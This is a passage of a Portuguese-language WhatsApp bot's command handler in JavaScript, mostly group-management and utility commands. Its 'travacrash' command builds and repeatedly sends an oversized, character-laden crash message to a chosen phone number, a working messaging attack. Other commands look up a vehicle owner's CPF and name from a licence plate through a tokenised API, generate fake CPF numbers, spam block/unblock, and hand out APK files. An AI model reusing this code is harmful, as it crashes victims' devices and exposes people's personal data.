if(!a.id.startsWith("55") && a.id !== botNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return reply("Nenhum número fake encontrado no grupo")
for(let a of array_fake) {
await sleep(100)
aqua.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} números fake removido do grupo`
aqua.sendMessage(from, {text: teks, mentions: array_fake})
}
break


case 'gerarcpf':
case 'gerar-CPF':
if(!isPremium) return reply(enviar.msg.premium)
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
await aqua.sendMessage(from, {text: `CPF gerado com sucesso : ${cpf}`}, {quoted: selo})
break

case 'cep':
if(!isPremium) return reply(enviar.msg.premium)  
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 54330235`)
query = args.join(" ")
get_result = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/tools/cep?apikey=apiteam&cep=${query}`)
x = get_result.resultado
k = `CEP : ${x.cep}
LOGRADOURO: ${x.logradouro}
BAIRRO : ${x.bairro}
LOCALIDADE : ${x.localidade}
UF : ${x.uf}
IBGE : ${x.ibge}
GIA : ${x.gia}
DDD : ${x.ddd}
SIAFI : ${x.siafi}`
reply(k)
break 

case 'placa':
if(!isPremium) return reply(enviar.msg.premium)  
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 54330235`)
query = args.join(" ")
get_result = await fetchJson(`http://api.ifindconsultas.tk/?token=2d6de38e-6c92-485e-bacb-db64139f8a02&placa=${query}`)
x = get_result
k = `CPF : ${x.cpf}
NOME: ${x.nome}
PLACA : ${x.placa}
CHASSI : ${x.chassi}
RENAVAM : ${x.renavam}
CIDADE : ${x.cidade}
UF : ${x.uf}
CATEGORIA : ${x.categoria}
COMBUSTÍVEL : ${x.combustivel}`
reply(k)
break 

case 'ddd':
if(!isPremium) return reply(enviar.msg.premium)
if (args.length < 1) return reply(`Use ${prefix + command} 21`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }
aqua.sendMessage(from, {text: dddlist}, {quoted: selo})	
break

case 'listaddd':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(args.length < 1) return reply('*FALE O CÓDIGO DO PAÍS*')
if(isNaN(args[0]))return reply('*FALE O CÓDIGO DO PAÍS*')
teks = `NÚMEROS COM CÓDIGO DE PAÍS +${args[0]} REGISTRADOS NO GRUPO:\n`
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(args[0])) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply(`*NENHUM NÚMERO +${args[0]} FOI ENCONTRADO*`)
aqua.sendMessage(from, {text: teks, mentions: men})
break

case 'listafake':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
teks = '𝗙𝗔𝗞𝗘𝗦 𝗡𝗢 𝗚𝗥𝗨𝗣𝗢  \n'
men = []
for(let mem of groupMembers) {
    if(!mem.id.startsWith(55)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply(' 𝗡𝗲𝗻𝗵𝘂𝗺 𝗙𝗮𝗹𝘀𝗼 𝗗𝗲𝘁𝗲𝗰𝘁𝗮𝗱𝗼')
aqua.sendMessage(from, {text: teks, mentions: men})
break

case 'listabr':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
teks = '𝗕𝗥𝗔??𝗜𝗟𝗘𝗜𝗥𝗢𝗦 𝗡𝗢 𝗚𝗥𝗨𝗣𝗢 \n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(55)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply('🇧🇷 *NENHUM NÚMERO BR FOI ENCONTRADO* 🇧🇷')
aqua.sendMessage(from, {text: teks, mentions: men})
break


case 'encurtalink':
if(!isPremium) return reply(enviar.msg.premium)
if(args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink https://youtube.com/c/PLMODS`)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
await limitAdd(sender)
break


case 'celular': //alterado
if (!q) return reply(`Qual celular você está procurando?`)
ane = await fetchJson(`https://api-yogipw.herokuapp.com/api/search/gsmarena?query=${q}`)
busca_celular = `📝 Titulo: ${ane.judul}
❗Última atualização: ${ane.rilis}
📱 Tamanho do celular: ${ane.ukuran}
⚡ Tipo: ${ane.type}
🗃️ Armazenamento: ${ane.storage}
📴 Tela: ${ane.display}
📳 Polegada: ${ane.inchi}
🔰 Resolução da câmera: ${ane.pixel}
📲 Resolução do video: ${ane.videoPixel}
💭 Ram do celular: ${ane.ram}
👤 Hardware do celular: ${ane.chipset}
⚠️ Bateria: ${ane.batrai}
🔋 Tipo da bateria: ${ane.merek_batre}`
aqua.sendMessage(from, {image: {url: `${ane.thumb}`}, caption: `${busca_celular}`}, {quoted: selo})
break

case 'cassino':
  
const soto = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍇',
'🍊 : 🍋 : 🔔',
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : 🍊',
'🍊 : 🍋 : ??',		
'🍐 : 🍒 : 🍋',
'🍐 : 🍐 : 🍐',
'🍊 : 🍒 : 🍒',
'🔔 : 🔔 : 🍇',
'🍌 : 🍒 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍌',
'🔔 : 🔔 : 🍇',
'🔔 : 🍐 : 🍇',
'🔔 : 🔔 : 🔔',
'🍒 : 🍒 : 🍒',
'🍌 : 🍌 : 🍌'
]		  

const somtoy2 = sotoy[Math.floor(Math.random() * sotoy.length)]
if ((somtoy2 == '🥑 : 🥑 : 🥑') ||(somtoy2 == '🍉 : 🍉 : 🍉') ||(somtoy2 == '?? : 🍓 : 🍓') ||(somtoy2 == '🍎 : 🍎 : 🍎') ||(somtoy2 == '🍍 : 🍍 : 🍍') ||(somtoy2 == '🥝 : 🥝 : 🥝') ||(somtoy2 == '🍑 : 🍑 : 🍑') ||(somtoy2 == '🥥 : 🥥 : 🥥') ||(somtoy2 == '🍋 : 🍋 : 🍋') ||(somtoy2 == '🍐 : 🍐 : 🍐') ||(somtoy2 == '🍌 : 🍌 : 🍌') ||(somtoy2 == '🍒 : 🍒 : 🍒') ||(somtoy2 == '🔔 : 🔔 : 🔔') ||(somtoy2 == '🍊 : 🍊 : 🍊') ||(somtoy2 == '🍇 : 🍇 : 🍇')) {
var Vitória = "Você ganhou!!!"
} else {
var Vitória = "Você perdeu..."
}

const cassino = `
┏━━━━❪🎰❫━━━━
┣► ${somtoy2}◄┛
┗━━━━❪💰❫━━━━

*${Vitória}*`
  
sendBtext(from, `${cassino}`,  `${Vitória}`, [
{buttonId: `${prefix}cassino`, buttonText: {displayText: `Proximo`}, type: 1}], selo)
break

//========FINAL DE CMD DE GRUPO=============

//======== CMD DE DONO=============


      case 'seradm': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
       reply(`Agora vc é adm do grupo.`)
kiceed = sender
aqua.groupParticipantsUpdate(from, [kiceed], 'promote')
}
break
case 'sermenbro': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
     reply(`Agora vc não é mais adm do grupo.`)
     kicee = sender
await aqua.groupParticipantsUpdate(from, [kicee], 'demote')
}
break

//======== FINAL DE CMD DE DONO=============


//========PING=============


case 'speed':
case 'ping':
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
sendBtext(from, `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║    ㅤ   ㅤ🇵  🇮  🇳  🇬              ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] OLÁ HUMANO:* ${pushname}
┠➥ *[⌛]* ${tempo}
┠➥ *[💬] CHAT:* ${!isGroup ? `${pushname}` :  `${groupName}`}
┠➥ *[⚡] PING:* ${latensie.toFixed(4)}
┠➥ *[📳] NÚMERO:* ${sender.split("@")[0]}
┠➥ *[🔱] PATENTE:* ${patt} 
┠➥ *[🟢] ATIVO:* ${runtime(uptime)}
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`, `➥@Licht.Offc\n➥@AquaBot.Wpp`, 
[{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦]  MENU COMPLETO [💦]`}, type: 1},
{buttonId: `$prefix}perfil`, buttonText: {displayText: `[💦] AQUA BOT SUPREMACY [💧]`}, type: 1}], )
break

//=====================================


//=====================================


case 'gtts':
if (args.length < 1) return reply(`Cade o texto?, digite algo Exemplo:\n${prefix}gtts PT Oi`) 
const gtts = require('./funções de cmd/funções/gtts')(args[0])
if (args.length < 2) return reply('Falta colocar o código do idioma!')
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 4000) return reply('Para reduzir spam o máximo de letras permitidas são 4000!')
gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
aqua.sendMessage(from, {audio: buffer, ptt:true}, {quoted: selo})
fs.unlinkSync(rano)
})
})
break

case 'gerarlink':  
case 'imgpralink':    
try {
if (isQuotedImage) {
reply(enviar.espere)
boij = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : m
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande uma imagem com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe 😔')
}
break

case 'videourl':
case 'videopralink':
try {
if ((isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
boij = isQuotedVideo ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : m
owgi = await getFileBuffer(boij, 'video')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande vídeo com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe 😔/ O limite do tamanho de vídeo que gero o link, é 30 segundos.')
}
break

//===============TRAVAZAPI======================


case 'timegrup': 
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
{
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title: "[💦] AQUA BOT SUPREMACY [💦] ",
rows: [
{title: "[💦] 30 SEGUNDOS [💦]", rowId: `${prefix}grupo30s`},
{title: "[💦] 01 MINUTO [💦]", rowId: `${prefix}grupo1m`},
{title: "[💦] 02 MINUTOS [💦]", rowId: `${prefix}grupo2m`},
{title: "[💦] 05 MINUTOS [💦]", rowId: `${prefix}grupo5m`},
{title: "[💦] 10 MINUTOS [💦]", rowId: `${prefix}grupo10m`},
{title: "[💦] 20 MINUTOS [💦]", rowId: `${prefix}grupo20m`},
{title: "[💦] 30 MINITOS [💦]", rowId: `${prefix}grupo30m`},
{title: "[💦] 01 HORA [💦]", rowId: `${prefix}grupo1h`},
{title: "[💦] 03 HORAS [💦]", rowId: `${prefix}grupo3h`},
{title: "[💦] 05 HORAS [💦]", rowId: `${prefix}grupo5h`},
{title: "[💦] 12 HORAS [💦]", rowId: `${prefix}grupo12h`}
]
},
]
 

const listMessage2 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║     ?? 🇪 🇫 🇮 🇳 🇮 🇷       ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] OLA ADEME:* ${pushname}
┠
┠➥ *AQUI ESTÃO AS OPÇÕES DE FECHAR E ABRIR O GRUPO, BASTA ESCOLHER O TEMPO*`,
  footer: `➥@Licht.Offc\n➥@AquaBot.Wpp`,
  title: ``,
  buttonText: "[💦] TIME LIST [💦]",
  sections
}
sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})
}
break


case 'grupo30s':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(30000); //30 segundos 
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo1m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(60000); //1 Minuto
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo2m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(120000); //2 Minutos
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo5m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(300000); //5 Minutos
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo10m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(600000); //10 Minutos 
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo20m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(1200000); //20 Minutos
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo30m':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(13800000); //30 Minutos
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo1h':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(27600000); //1 Hora
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo3h':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(82800000); //3 Horas
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo5h':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(138000000); //30 segundos 
aqua.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo12':
{
aqua.groupSettingUpdate(from, "announcement")
await sleep(331200000); //12 Horas
aqua.groupSettingUpdate(from, "not_announcement")
}
break


case "blockspam":
if(!SoDono) return reply("Voce é so um Humano Comum, Não Pode Usar Este Comando")
if (isGroup) return aqua.sendMessage(from, {text: 'apenas em privado'})
if (!q) return aqua.sendMessage(from, {text: 'Cadê a quantidade mn? 🤷‍♂�?'})
for (let i = `${q}`;i !== 0; i -=1){
aqua.updateBlockStatus(from, "block")
aqua.updateBlockStatus(from, "unblock")
}
break

case 'travacrash':
try {
if(!isPremium) return reply(enviar.msg.premium)
if(q && args[0] === "-fake") {
teks = ""
for (var i = 0; i < 10; i++) {
teks += "💤"
}
tekks = ""
for (var i = 0; i < 100; i++) {
tekks += "؅؀؁؂؃؄"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‍"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `AQUA BOT DARK MODE${tekkss}${tekks}`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await aqua.sendMessage(from, fuck, {quoted:selocrash})
await aqua.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cade o número?`)
let [result] = await aqua.onWhatsApp(id)
if(!result) return reply(`Numero inexistente`)
teks = ""
for (var i = 0; i < 60000; i++) {
teks += "💤"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `AQUA BOT DARK MODE`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await aqua.sendMessage(result.jid, fuck, {quoted:selocrash})
await aqua.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
await sleep(500)
}
aqua.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu erro")
}
break	






//=====================================

case 'mediafire':
reply(enviar.espere)
try {
if (!q) return reply(`Coloque um link`)
if (!isUrl(q) || !q.includes('mediafire.com')) return reply(`Link inválido!`)
mfdw = await mediafire(`${args[0]}`)
buttons02 = [
{buttonId: `${mfdw[0].link}`, buttonText: {displayText: `${mfdw[0].link}`}, type: 1}
]
if (mfdw[0].peso.split('MB')[0] >= 250)
{
buttonMessage02 = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `${NomeDoBot} ✅`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

[📌] NOME: ${mfdw[0].nome}
[⚖️] PESO:: ${mfdw[0].peso}
[🗂️] ARQUIVO: ${mfdw[0].tipo}`,
footer: `Arquivo muito pesado para ser enviado pelo WhatsApp.`,
buttons: buttons02,
headerType: 4,
}
aqua.sendMessage(from, buttonMessage02)
} else {
buttonMessage02 = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `${NomeDoBot} ✅`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

[📌] NOME: ${mfdw[0].nome}
[⚖️] PESO: ${mfdw[0].peso}
[🗂️] ARQUIVO: ${mfdw[0].tipo}`,
footer: `Aproveita Que to Baixando, e Segue no Insta\n@Licht.Offc\n@AquaBot.Wpp`,
buttons: buttons02,
headerType: 4,
}
aqua.sendMessage(from, buttonMessage02)
await sleep(1000)
aqua.sendMessage(from, {document: {url: mfdw[0].link}, fileName: mfdw[0].nome, mimetype: mfdw[0].tipo, mentions: [sender]}, {quoted: selo})
}
} catch (err) {
console.log(err)
reply("Ocorreu um erro.")
}
break

case 'imune':
try {
bla = await mediafire(`https://www.mediafire.com/file/xx6oe3jkj6rd1w6/10KBishop[Azul].apk/file'`)
aqua.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'imune2':
try {
bla = await mediafire(`https://www.mediafire.com/file/z40b8lqorh4r19z/TISU_V11_%2528ROXO%2529_SECUND%25C3%2581RIO.apk/file`)
aqua.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break
	
case 'bc': case 'broadcast':
			if (!SoDono) return reply(mess.owner)
var data = await store.chats.all()
for (let i of data) {
 aqua.sendMessage(i.id, { text: `*[ TRANSMISSÃO AQUA BOT SUPREMACY ]*\n\n${q}` })
 await sleep(3000)
}
break	

//================ANTIS=============
case 'grupo': 
if (!isGroup) return reply(`Só em grupo`)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args[0] === 'a') {
reply(`*GRUPO ABERTO COM SUCESSO*`)
await aqua.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'f') {
reply(`*GRUPO FECHADO COM SUCESSO*`)
await aqua.groupSettingUpdate(from, 'announcement')
} else {
buttons02 = [
{buttonId: `${prefix + command} a`, buttonText: {displayText: 'Abrir'}, type: 1},
{buttonId: `${prefix + command} f`, buttonText: {displayText: 'Fechar'}, type: 1},
]
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮
         𝗔𝗕𝗥𝗜𝗥/𝗙??𝗖𝗛𝗔𝗥 ??𝗥𝗨𝗣𝗢
╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `Aperte no botão abaixo para abrir ou fechar o grupo.\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted: selo})
}
break 

case 'infogp':   
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins)return reply(enviar.msg.adm)
ppUrl = await aqua.profilePictureUrl(from, 'image')
buffer = await getBuffer(ppUrl)
const metadatqa = await aqua.groupMetadata(from) 
aqua.sendMessage(from, {image: buffer, caption: `
*[📌] NOME:* ${groupName}
*[📅] DATA:* ${date}
*[🕛] HORA:* ${hora}
*[🗣️] ADMS:* ${groupAdmins.length}
*[👥] MEMBROS:* ${groupMembers.length}
*[🆔] ID:* ${from}
*[📃] DESCRIÇÃO:* \n\n ${groupDesc}\n
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`, thumbnail: null}, {quoted: selo})
break 

case 'novolink':
case 'redefinir':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
try {
await aqua.groupRevokeInvite(from)
reply('LINK DO GRUPO REDEFINIDO')
} catch(e) {
console.log(e)
enviar(`ERRO MAN`)
}
break
  
  case 'configp': case 'configuração': case 'ajuda': case 'grupo':  {



if (!isGroup) return reply(mess.group)

if (!isBotAdmins) return reply(mess.botAdmin)

if (!isGroupAdmins && !SoDono) return reply(mess.admin)



	timestampe = speed();

latensie = speed() - timestampe

uptime = process.uptime()

sections = [

{

title: "[💦] AQUA BOT SUPREMACY [💦] ",

rows: [

{title: "[✅]𝗔𝗕𝗥𝗜𝗥 𝗢 𝗚𝗥𝗨𝗣𝗢 [✅]", rowId: `${prefix}abrirgp a`},

{title: "[❌]𝗙𝗘𝗖𝗛𝗔𝗥 𝗢 𝗚𝗥𝗨𝗣𝗢[❌]", rowId: `${prefix}abrirgp f`},

{title: "[⚙️] 𝗩𝗘𝗥 𝗔𝗝𝗨𝗦𝗧𝗘𝗦 𝗔𝗧𝗜𝗩𝗢𝗦 [⚙️]", rowId: `${prefix}status`},

{title: "[✅] 𝗣𝗥𝗢𝗜𝗕𝗜𝗥 𝗖𝗠𝗗 𝗡𝗢 𝗣𝗩 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antipv1`},

{title: "[✅] 𝗔𝗨𝗧𝗢 𝗥𝗘𝗔𝗖𝗧 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}autoreact 1`},

{title: "[✅] 𝗙𝗜𝗚𝗨𝗥𝗜𝗡𝗛𝗔 ??𝗨𝗧𝗢 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}autofig-gp 1`},

{title: "[✅] 𝗔𝗡𝗧𝗜 𝗙𝗔𝗞𝗘 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antifake 1`},

{title: "[✅] 𝗔𝗡𝗧𝗜 𝗖𝗢𝗡𝗧𝗔𝗧𝗢 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}ct1`},

{title: "[✅] 𝗔𝗡𝗧𝗜 𝗟𝗢𝗖 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antiloc 1`},

{title: "[✅] 𝗔𝗡𝗧𝗜 𝗟𝗜𝗡𝗞 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antilink 1`},

{title: "[✅] 𝗔𝗡𝗧𝗜 𝗡𝗢𝗧𝗔𝗦 𝗙𝗔𝗞𝗘 [𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antinotas 1`},

{title: "[❌] 𝗣𝗥𝗢𝗜𝗕𝗜𝗥 𝗖𝗠𝗗 𝗡𝗢 𝗣𝗩 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antipv0`},

{title: "[❌] 𝗔𝗨𝗧𝗢 𝗥𝗘𝗔𝗖𝗧 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}autoreact 0`},

{title: "[❌] 𝗙𝗜𝗚𝗨𝗥𝗜𝗡𝗛𝗔 𝗔𝗨𝗧𝗢 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}autofig-gp 0`},

{title: "[❌] 𝗔𝗡𝗧𝗜 𝗙𝗔𝗞𝗘 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antifake 0`},

{title: "[❌] 𝗔𝗡𝗧𝗜 𝗖𝗢𝗡𝗧𝗔𝗧𝗢 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}ct0`},

{title: "[❌] 𝗔𝗡𝗧𝗜 𝗟𝗢𝗖 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antiloc 0`},

{title: "[❌] 𝗔𝗡𝗧𝗜 𝗟𝗜𝗡𝗞 [𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗥]", rowId: `${prefix}antilink 0`},

{title: "[❌] ANTI NOTAS FAKE [DESATIVAR]", rowId: `${prefix}antinotas 0`},

{title: "[♻️] 𝗥𝗘𝗦𝗘𝗧𝗔𝗥 𝗟𝗜𝗡𝗞 𝗗𝗢 𝗚𝗥𝗨𝗣𝗢 [♻️]", rowId: `${prefix}novolink`}

]

},

]

 



const listMessage2 = {

text: `

╭━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔🌹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━╮

│ _Oii, ${pushname}, ${tempo}_🌹

│

┝〢 _Ajuste as configurações abaixo_

│ 

│ *_Não esqueça de apoiar o criador_*

╰━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔🌹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━╯`,

  buttonText: "[🛠️] 𝗠𝗘𝗡𝗨 𝗔𝗝𝗨𝗦𝗧𝗘𝗦 [🛠️]",

  sections

}

sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})

}

break


case 'autostick':
case 'autofig-geral':
if (args.length < 1) return reply('autofig-pv 1 para ativar \n autofig-pv 0 para desativar')
if (args[0]  === '1'){
if (isAutoStick) return reply(`Já ativo`)
autostick.push(from)
fs.writeFileSync('./funções de cmd/funções/autostickpc.json', JSON.stringify(autosticker))
reply('autofig-pv ativo')
} else if (args[0] === '0'){
anu = autosticker.indexOf(from)
autostick.splice(anu, 1)
fs.writeFileSync('./funções de cmd/funções/autostickpc.json', JSON.stringify(autosticker))
reply('Auto Sticker Ativo')
}
break

case 'antiligar':
case 'antiligacao':  
case 'antiligação':  
try {
if (!SoDono  && !m.key.fromMe) return reply(mess.owner)
